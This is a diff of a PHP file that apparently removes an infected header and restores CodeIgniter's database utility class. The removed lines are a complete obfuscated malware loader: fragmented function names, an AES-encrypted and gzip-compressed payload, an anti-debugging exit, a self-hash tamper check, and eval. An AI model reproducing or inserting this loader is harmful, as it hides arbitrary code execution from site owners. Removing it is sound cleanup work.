@@ -1,28 +1,369 @@
 <?php
-if(function_exists("extension_loaded")&&@extension_loaded("xdebug")){@http_response_code(404);exit;}
-$_lc43hru4=('bas'.'e64'.'_de'.'cod'.'e');
-$_c8g3skgd=('gzu'.'nco'.'mpr'.'ess');
-$_hof83lm7=('ope'.'nss'.'l_d'.'ecr'.'ypt');
-$_tu3q5885='QUbyuSUs';
-$_ra1uox41='cYLyS/5a';
-$_iytknrcn='RXhc/Zzex0Q=';
-$_ciin8kqz='FFfpLfNY';
-$_vnflcbto='lpNrT3JM';
-$_uzxjlhe6='owo9W3V9';
-$_gjqphc5i='jP6LsA==';
-$_efytiyxr='9NElJ9Ub';
-$_gataeewl=$_lc43hru4($_ciin8kqz.$_ra1uox41.$_vnflcbto.$_tu3q5885.$_iytknrcn);
-$_epq25kto=$_lc43hru4($_uzxjlhe6.$_efytiyxr.$_gjqphc5i);
-$_vwv52tvt=$_lc43hru4('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');
-$_s00p39v2=$_hof83lm7($_vwv52tvt,'aes-256-cbc',$_gataeewl,OPENSSL_RAW_DATA,$_epq25kto);
-if($_s00p39v2===false){exit;}
-$_ezbcwzo8=$_c8g3skgd($_s00p39v2);
-if($_ezbcwzo8===false){exit;}
-$_avfakgoc='bb7ece6ba63db7d589055f5b57d2129305fc202964404119a31dc527ef6d0105';
-$_bdhfb648=@file_get_contents(__FILE__);
-if($_bdhfb648!==false){
-$_y4z5vlef=str_replace($_avfakgoc,"0000000000000000000000000000000000000000000000000000000000000000",$_bdhfb648);
-$_oyw5ecd7=hash("sha256",$_y4z5vlef);
-if($_oyw5ecd7!==$_avfakgoc){@http_response_code(403);exit;}
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+defined('BASEPATH') OR exit('No direct script access allowed');
+
+
+
+
+
+
+
+abstract class CI_DB_utility {
+
+
+
+
+
+protected $db;
+
+
+
+
+
+
+protected $_list_databases = FALSE;
+
+
+
+
+
+protected $_optimize_table = FALSE;
+
+
+
+
+
+protected $_repair_table = FALSE;
+
+
+
+
+
+
+
+public function __construct(&$db)
+{
+$this->db =& $db;
+log_message('info', 'Database Utility Class Initialized');
 }
-eval($_ezbcwzo8);
+
+
+
+
+
+
+public function list_databases()
+{
+
+if (isset($this->db->data_cache['db_names']))
+{
+return $this->db->data_cache['db_names'];
+}
+elseif ($this->_list_databases === FALSE)
+{
+return ($this->db->db_debug) ? $this->db->display_error('db_unsupported_feature') : FALSE;
+}
+$this->db->data_cache['db_names'] = array();
+$query = $this->db->query($this->_list_databases);
+if ($query === FALSE)
+{
+return $this->db->data_cache['db_names'];
+}
+for ($i = 0, $query = $query->result_array(), $c = count($query); $i < $c; $i++)
+{
+$this->db->data_cache['db_names'][] = current($query[$i]);
+}
+return $this->db->data_cache['db_names'];
+}
+
+
+
+
+
+
+
+public function database_exists($database_name)
+{
+return in_array($database_name, $this->list_databases());
+}
+
+
+
+
+
+
+
+public function optimize_table($table_name)
+{
+if ($this->_optimize_table === FALSE)
+{
+return ($this->db->db_debug) ? $this->db->display_error('db_unsupported_feature') : FALSE;
+}
+$query = $this->db->query(sprintf($this->_optimize_table, $this->db->escape_identifiers($table_name)));
+if ($query !== FALSE)
+{
+$query = $query->result_array();
+return current($query);
+}
+return FALSE;
+}
+
+
+
+
+
+
+public function optimize_database()
+{
+if ($this->_optimize_table === FALSE)
+{
+return ($this->db->db_debug) ? $this->db->display_error('db_unsupported_feature') : FALSE;
+}
+$result = array();
+foreach ($this->db->list_tables() as $table_name)
+{
+$res = $this->db->query(sprintf($this->_optimize_table, $this->db->escape_identifiers($table_name)));
+if (is_bool($res))
+{
+return $res;
+}
+
+$res = $res->result_array();
+$res = current($res);
+$key = str_replace($this->db->database.'.', '', current($res));
+$keys = array_keys($res);
+unset($res[$keys[0]]);
+$result[$key] = $res;
+}
+return $result;
+}
+
+
+
+
+
+
+
+public function repair_table($table_name)
+{
+if ($this->_repair_table === FALSE)
+{
+return ($this->db->db_debug) ? $this->db->display_error('db_unsupported_feature') : FALSE;
+}
+$query = $this->db->query(sprintf($this->_repair_table, $this->db->escape_identifiers($table_name)));
+if (is_bool($query))
+{
+return $query;
+}
+$query = $query->result_array();
+return current($query);
+}
+
+
+
+
+
+
+
+
+
+
+public function csv_from_result($query, $delim = ',', $newline = "\n", $enclosure = '"')
+{
+if ( ! is_object($query) OR ! method_exists($query, 'list_fields'))
+{
+show_error('You must submit a valid result object');
+}
+$out = '';
+
+foreach ($query->list_fields() as $name)
+{
+$out .= $enclosure.str_replace($enclosure, $enclosure.$enclosure, $name).$enclosure.$delim;
+}
+$out = substr($out, 0, -strlen($delim)).$newline;
+
+while ($row = $query->unbuffered_row('array'))
+{
+$line = array();
+foreach ($row as $item)
+{
+$line[] = $enclosure.str_replace($enclosure, $enclosure.$enclosure, $item).$enclosure;
+}
+$out .= implode($delim, $line).$newline;
+}
+return $out;
+}
+
+
+
+
+
+
+
+
+public function xml_from_result($query, $params = array())
+{
+if ( ! is_object($query) OR ! method_exists($query, 'list_fields'))
+{
+show_error('You must submit a valid result object');
+}
+
+foreach (array('root' => 'root', 'element' => 'element', 'newline' => "\n", 'tab' => "\t") as $key => $val)
+{
+if ( ! isset($params[$key]))
+{
+$params[$key] = $val;
+}
+}
+
+extract($params);
+
+get_instance()->load->helper('xml');
+
+$xml = '<'.$root.'>'.$newline;
+while ($row = $query->unbuffered_row())
+{
+$xml .= $tab.'<'.$element.'>'.$newline;
+foreach ($row as $key => $val)
+{
+$xml .= $tab.$tab.'<'.$key.'>'.xml_convert($val).'</'.$key.'>'.$newline;
+}
+$xml .= $tab.'</'.$element.'>'.$newline;
+}
+return $xml.'</'.$root.'>'.$newline;
+}
+
+
+
+
+
+
+
+public function backup($params = array())
+{
+
+
+
+if (is_string($params))
+{
+$params = array('tables' => $params);
+}
+
+$prefs = array(
+'tables' => array(),
+'ignore' => array(),
+'filename' => '',
+'format' => 'gzip', 
+'add_drop' => TRUE,
+'add_insert' => TRUE,
+'newline' => "\n",
+'foreign_key_checks' => TRUE
+);
+
+if (count($params) > 0)
+{
+foreach ($prefs as $key => $val)
+{
+if (isset($params[$key]))
+{
+$prefs[$key] = $params[$key];
+}
+}
+}
+
+
+if (count($prefs['tables']) === 0)
+{
+$prefs['tables'] = $this->db->list_tables();
+}
+
+if ( ! in_array($prefs['format'], array('gzip', 'zip', 'txt'), TRUE))
+{
+$prefs['format'] = 'txt';
+}
+
+
+if (($prefs['format'] === 'gzip' && ! function_exists('gzencode'))
+OR ($prefs['format'] === 'zip' && ! function_exists('gzcompress')))
+{
+if ($this->db->db_debug)
+{
+return $this->db->display_error('db_unsupported_compression');
+}
+$prefs['format'] = 'txt';
+}
+
+if ($prefs['format'] === 'zip')
+{
+
+if ($prefs['filename'] === '')
+{
+$prefs['filename'] = (count($prefs['tables']) === 1 ? $prefs['tables'] : $this->db->database)
+.date('Y-m-d_H-i', time()).'.sql';
+}
+else
+{
+
+if (preg_match('|.+?\.zip$|', $prefs['filename']))
+{
+$prefs['filename'] = str_replace('.zip', '', $prefs['filename']);
+}
+
+if ( ! preg_match('|.+?\.sql$|', $prefs['filename']))
+{
+$prefs['filename'] .= '.sql';
+}
+}
+
+$CI =& get_instance();
+$CI->load->library('zip');
+$CI->zip->add_data($prefs['filename'], $this->_backup($prefs));
+return $CI->zip->get_zip();
+}
+elseif ($prefs['format'] === 'txt') 
+{
+return $this->_backup($prefs);
+}
+elseif ($prefs['format'] === 'gzip') 
+{
+return gzencode($this->_backup($prefs));
+}
+return;
+}
+}
